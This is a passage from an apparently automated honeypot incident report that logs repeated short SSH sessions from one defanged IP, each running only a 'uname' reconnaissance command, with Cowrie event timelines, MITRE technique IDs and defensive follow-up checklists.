| `2026-06-03 12:05:55` | `cowrie.log.closed` |
| `2026-06-03 12:05:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9013c58dc86a

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:06 |
| **Last Seen** | 2026-06-03 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:06:57` | `cowrie.session.connect` |
| `2026-06-03 12:06:57` | `cowrie.client.version` |
| `2026-06-03 12:06:57` | `cowrie.client.kex` |
| `2026-06-03 12:06:58` | `cowrie.login.success` |
| `2026-06-03 12:06:58` | `cowrie.session.params` |
| `2026-06-03 12:06:58` | `cowrie.command.input` |
| `2026-06-03 12:06:59` | `cowrie.log.closed` |
| `2026-06-03 12:06:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a46979f7c570

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:07 |
| **Last Seen** | 2026-06-03 12:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:07:20` | `cowrie.session.connect` |
| `2026-06-03 12:07:20` | `cowrie.client.version` |
| `2026-06-03 12:07:20` | `cowrie.client.kex` |
| `2026-06-03 12:07:22` | `cowrie.login.success` |
| `2026-06-03 12:07:22` | `cowrie.session.params` |
| `2026-06-03 12:07:22` | `cowrie.command.input` |
| `2026-06-03 12:07:22` | `cowrie.log.closed` |
| `2026-06-03 12:07:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3c84b6a392e

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:08 |
| **Last Seen** | 2026-06-03 12:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:08:23` | `cowrie.session.connect` |
| `2026-06-03 12:08:23` | `cowrie.client.version` |
| `2026-06-03 12:08:24` | `cowrie.client.kex` |
| `2026-06-03 12:08:25` | `cowrie.login.success` |
| `2026-06-03 12:08:25` | `cowrie.session.params` |
| `2026-06-03 12:08:25` | `cowrie.command.input` |
| `2026-06-03 12:08:25` | `cowrie.log.closed` |
| `2026-06-03 12:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf10021ce57e

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:08 |
| **Last Seen** | 2026-06-03 12:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:08:58` | `cowrie.session.connect` |
| `2026-06-03 12:08:58` | `cowrie.client.version` |
| `2026-06-03 12:08:58` | `cowrie.client.kex` |
| `2026-06-03 12:08:59` | `cowrie.login.success` |
| `2026-06-03 12:08:59` | `cowrie.session.params` |
| `2026-06-03 12:08:59` | `cowrie.command.input` |
| `2026-06-03 12:09:00` | `cowrie.log.closed` |
| `2026-06-03 12:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bc0ae6cc090

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:09 |
| **Last Seen** | 2026-06-03 12:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:09:03` | `cowrie.session.connect` |
| `2026-06-03 12:09:03` | `cowrie.client.version` |
| `2026-06-03 12:09:03` | `cowrie.client.kex` |
| `2026-06-03 12:09:05` | `cowrie.login.success` |
| `2026-06-03 12:09:05` | `cowrie.session.params` |
| `2026-06-03 12:09:05` | `cowrie.command.input` |
| `2026-06-03 12:09:05` | `cowrie.log.closed` |
| `2026-06-03 12:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-203b3f4ec55d

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:11 |
| **Last Seen** | 2026-06-03 12:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:11:05` | `cowrie.session.connect` |
| `2026-06-03 12:11:05` | `cowrie.client.version` |
| `2026-06-03 12:11:05` | `cowrie.client.kex` |
| `2026-06-03 12:11:06` | `cowrie.login.success` |
| `2026-06-03 12:11:07` | `cowrie.session.params` |
| `2026-06-03 12:11:07` | `cowrie.command.input` |
| `2026-06-03 12:11:07` | `cowrie.log.closed` |
| `2026-06-03 12:11:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8aad785fcfd

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:11 |
| **Last Seen** | 2026-06-03 12:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:11:39` | `cowrie.session.connect` |
| `2026-06-03 12:11:39` | `cowrie.client.version` |
| `2026-06-03 12:11:40` | `cowrie.client.kex` |
| `2026-06-03 12:11:41` | `cowrie.login.success` |
| `2026-06-03 12:11:41` | `cowrie.session.params` |
| `2026-06-03 12:11:41` | `cowrie.command.input` |
| `2026-06-03 12:11:42` | `cowrie.log.closed` |
| `2026-06-03 12:11:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c31c5b85a36

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:12 |
| **Last Seen** | 2026-06-03 12:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:12:31` | `cowrie.session.connect` |
| `2026-06-03 12:12:31` | `cowrie.client.version` |
| `2026-06-03 12:12:31` | `cowrie.client.kex` |
| `2026-06-03 12:12:32` | `cowrie.login.success` |
| `2026-06-03 12:12:33` | `cowrie.session.params` |
| `2026-06-03 12:12:33` | `cowrie.command.input` |
| `2026-06-03 12:12:33` | `cowrie.log.closed` |
| `2026-06-03 12:12:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38520b987a9a

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:13 |
| **Last Seen** | 2026-06-03 12:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:13:17` | `cowrie.session.connect` |
| `2026-06-03 12:13:17` | `cowrie.client.version` |
| `2026-06-03 12:13:17` | `cowrie.client.kex` |
| `2026-06-03 12:13:19` | `cowrie.login.success` |
| `2026-06-03 12:13:19` | `cowrie.session.params` |
| `2026-06-03 12:13:19` | `cowrie.command.input` |
| `2026-06-03 12:13:19` | `cowrie.log.closed` |
| `2026-06-03 12:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c1f792ac005

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:13 |
| **Last Seen** | 2026-06-03 12:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:13:35` | `cowrie.session.connect` |
| `2026-06-03 12:13:35` | `cowrie.client.version` |
| `2026-06-03 12:13:35` | `cowrie.client.kex` |
| `2026-06-03 12:13:36` | `cowrie.login.success` |
| `2026-06-03 12:13:36` | `cowrie.session.params` |
| `2026-06-03 12:13:36` | `cowrie.command.input` |
| `2026-06-03 12:13:36` | `cowrie.log.closed` |
| `2026-06-03 12:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c6bb8dee299

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:13 |
| **Last Seen** | 2026-06-03 12:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:13:52` | `cowrie.session.connect` |
| `2026-06-03 12:13:52` | `cowrie.client.version` |
| `2026-06-03 12:13:52` | `cowrie.client.kex` |
| `2026-06-03 12:13:54` | `cowrie.login.success` |
| `2026-06-03 12:13:54` | `cowrie.session.params` |
| `2026-06-03 12:13:54` | `cowrie.command.input` |
| `2026-06-03 12:13:54` | `cowrie.log.closed` |
| `2026-06-03 12:13:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20707d0c3a89

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:14 |
| **Last Seen** | 2026-06-03 12:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:14:04` | `cowrie.session.connect` |
| `2026-06-03 12:14:04` | `cowrie.client.version` |
| `2026-06-03 12:14:04` | `cowrie.client.kex` |
| `2026-06-03 12:14:05` | `cowrie.login.success` |
| `2026-06-03 12:14:05` | `cowrie.session.params` |
| `2026-06-03 12:14:05` | `cowrie.command.input` |
| `2026-06-03 12:14:06` | `cowrie.log.closed` |
| `2026-06-03 12:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c732681311c4

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:14 |
| **Last Seen** | 2026-06-03 12:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:14:15` | `cowrie.session.connect` |
| `2026-06-03 12:14:15` | `cowrie.client.version` |
| `2026-06-03 12:14:16` | `cowrie.client.kex` |
| `2026-06-03 12:14:17` | `cowrie.login.success` |
| `2026-06-03 12:14:17` | `cowrie.session.params` |
| `2026-06-03 12:14:17` | `cowrie.command.input` |
| `2026-06-03 12:14:18` | `cowrie.log.closed` |
| `2026-06-03 12:14:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab5a78f58829

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:14 |
| **Last Seen** | 2026-06-03 12:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:14:33` | `cowrie.session.connect` |
| `2026-06-03 12:14:33` | `cowrie.client.version` |
| `2026-06-03 12:14:33` | `cowrie.client.kex` |
| `2026-06-03 12:14:34` | `cowrie.login.success` |
| `2026-06-03 12:14:34` | `cowrie.session.params` |
| `2026-06-03 12:14:34` | `cowrie.command.input` |
| `2026-06-03 12:14:35` | `cowrie.log.closed` |
| `2026-06-03 12:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38221cde4c97

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:14 |
| **Last Seen** | 2026-06-03 12:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:14:56` | `cowrie.session.connect` |
| `2026-06-03 12:14:56` | `cowrie.client.version` |
| `2026-06-03 12:14:56` | `cowrie.client.kex` |
| `2026-06-03 12:14:57` | `cowrie.login.success` |
| `2026-06-03 12:14:58` | `cowrie.session.params` |
| `2026-06-03 12:14:58` | `cowrie.command.input` |
| `2026-06-03 12:14:58` | `cowrie.log.closed` |
| `2026-06-03 12:14:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4521392a51a

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:15 |
| **Last Seen** | 2026-06-03 12:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:15:02` | `cowrie.session.connect` |
| `2026-06-03 12:15:02` | `cowrie.client.version` |
| `2026-06-03 12:15:02` | `cowrie.client.kex` |
| `2026-06-03 12:15:03` | `cowrie.login.success` |
| `2026-06-03 12:15:03` | `cowrie.session.params` |
| `2026-06-03 12:15:03` | `cowrie.command.input` |
| `2026-06-03 12:15:04` | `cowrie.log.closed` |
| `2026-06-03 12:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bb85dd2a9c6

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:15 |
| **Last Seen** | 2026-06-03 12:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:15:08` | `cowrie.session.connect` |
| `2026-06-03 12:15:08` | `cowrie.client.version` |
| `2026-06-03 12:15:08` | `cowrie.client.kex` |
| `2026-06-03 12:15:09` | `cowrie.login.success` |
| `2026-06-03 12:15:10` | `cowrie.session.params` |
| `2026-06-03 12:15:10` | `cowrie.command.input` |
| `2026-06-03 12:15:10` | `cowrie.log.closed` |
| `2026-06-03 12:15:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc13d1e4880d

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:15 |
| **Last Seen** | 2026-06-03 12:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:15:13` | `cowrie.session.connect` |
| `2026-06-03 12:15:13` | `cowrie.client.version` |
| `2026-06-03 12:15:14` | `cowrie.client.kex` |
| `2026-06-03 12:15:15` | `cowrie.login.success` |
| `2026-06-03 12:15:15` | `cowrie.session.params` |
| `2026-06-03 12:15:15` | `cowrie.command.input` |
| `2026-06-03 12:15:15` | `cowrie.log.closed` |
| `2026-06-03 12:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b50caca97533

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:15 |
| **Last Seen** | 2026-06-03 12:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:15:31` | `cowrie.session.connect` |
| `2026-06-03 12:15:31` | `cowrie.client.version` |
| `2026-06-03 12:15:31` | `cowrie.client.kex` |
| `2026-06-03 12:15:32` | `cowrie.login.success` |
| `2026-06-03 12:15:33` | `cowrie.session.params` |
| `2026-06-03 12:15:33` | `cowrie.command.input` |
| `2026-06-03 12:15:33` | `cowrie.log.closed` |
| `2026-06-03 12:15:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e075bc63df05

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:15 |
| **Last Seen** | 2026-06-03 12:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:15:37` | `cowrie.session.connect` |
| `2026-06-03 12:15:37` | `cowrie.client.version` |
| `2026-06-03 12:15:37` | `cowrie.client.kex` |
| `2026-06-03 12:15:38` | `cowrie.login.success` |
| `2026-06-03 12:15:39` | `cowrie.session.params` |
| `2026-06-03 12:15:39` | `cowrie.command.input` |
| `2026-06-03 12:15:39` | `cowrie.log.closed` |
| `2026-06-03 12:15:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-581fd50f06e0

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:15 |
| **Last Seen** | 2026-06-03 12:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:15:48` | `cowrie.session.connect` |
| `2026-06-03 12:15:48` | `cowrie.client.version` |
| `2026-06-03 12:15:48` | `cowrie.client.kex` |
| `2026-06-03 12:15:50` | `cowrie.login.success` |
| `2026-06-03 12:15:50` | `cowrie.session.params` |
| `2026-06-03 12:15:50` | `cowrie.command.input` |
| `2026-06-03 12:15:50` | `cowrie.log.closed` |
| `2026-06-03 12:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aa12c0cbbe7

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:16 |
| **Last Seen** | 2026-06-03 12:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:16:05` | `cowrie.session.connect` |
| `2026-06-03 12:16:05` | `cowrie.client.version` |
| `2026-06-03 12:16:05` | `cowrie.client.kex` |
| `2026-06-03 12:16:07` | `cowrie.login.success` |
| `2026-06-03 12:16:07` | `cowrie.session.params` |
| `2026-06-03 12:16:07` | `cowrie.command.input` |
| `2026-06-03 12:16:07` | `cowrie.log.closed` |
| `2026-06-03 12:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47d093be14d8

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:16 |
| **Last Seen** | 2026-06-03 12:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:16:39` | `cowrie.session.connect` |
| `2026-06-03 12:16:39` | `cowrie.client.version` |
| `2026-06-03 12:16:39` | `cowrie.client.kex` |
| `2026-06-03 12:16:40` | `cowrie.login.success` |
| `2026-06-03 12:16:41` | `cowrie.session.params` |
| `2026-06-03 12:16:41` | `cowrie.command.input` |
| `2026-06-03 12:16:41` | `cowrie.log.closed` |
| `2026-06-03 12:16:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ae019142e1

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:17 |
| **Last Seen** | 2026-06-03 12:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:17:02` | `cowrie.session.connect` |
| `2026-06-03 12:17:02` | `cowrie.client.version` |
| `2026-06-03 12:17:02` | `cowrie.client.kex` |
| `2026-06-03 12:17:03` | `cowrie.login.success` |
| `2026-06-03 12:17:04` | `cowrie.session.params` |
| `2026-06-03 12:17:04` | `cowrie.command.input` |
| `2026-06-03 12:17:04` | `cowrie.log.closed` |
| `2026-06-03 12:17:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a149cb5048a

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:17 |
| **Last Seen** | 2026-06-03 12:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 12:17:14` | `cowrie.session.connect` |
| `2026-06-03 12:17:14` | `cowrie.client.version` |
| `2026-06-03 12:17:14` | `cowrie.client.kex` |
| `2026-06-03 12:17:16` | `cowrie.login.success` |
| `2026-06-03 12:17:16` | `cowrie.session.params` |
| `2026-06-03 12:17:16` | `cowrie.command.input` |
| `2026-06-03 12:17:16` | `cowrie.log.closed` |
| `2026-06-03 12:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.233.20[.]205` to AbuseIPDB if not already reported
- [ ] Block `152.233.20[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f13d1d4edc3

| Field | Detail |
|---|---|
| **Source IP** | `152.233.20[.]205` |
| **First Seen** | 2026-06-03 12:17 |
| **Last Seen** | 2026-06-03 12:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**
